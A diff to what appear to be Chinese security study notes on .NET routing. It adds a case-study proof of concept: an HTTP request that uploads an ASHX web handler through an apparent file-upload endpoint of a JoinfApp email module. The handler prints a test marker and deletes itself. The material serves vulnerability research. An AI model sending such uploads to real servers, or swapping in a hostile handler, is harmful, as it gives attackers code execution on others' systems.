@@ -278,3 +278,33 @@ public class RouteConfig
 ^
 ## **0x09、类似注解**
 ![](.topwrite/assets/image_1736318681712.png)
+
+
+^
+## **0x10、案例**
+```
+POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
+Host: 
+Content-Type: application/x-www-form-urlencoded
+
+<% @ webhandler language="C#" class="AverageHandler" %>
+using System;
+using System.Web;
+using System.IO;
+using System.Threading.Tasks;
+public class AverageHandler : IHttpHandler
+{
+    public bool IsReusable
+    { get { return false; } }
+    public void ProcessRequest(HttpContext ctx)
+    {
+        ctx.Response.Write("POC_TEST");
+        Task.Run(async () =>
+        {
+            File.Delete(ctx.Server.MapPath(ctx.Request.FilePath));
+        });
+        ctx.Response.Flush();
+        ctx.Response.End();
+    }
+}
+```
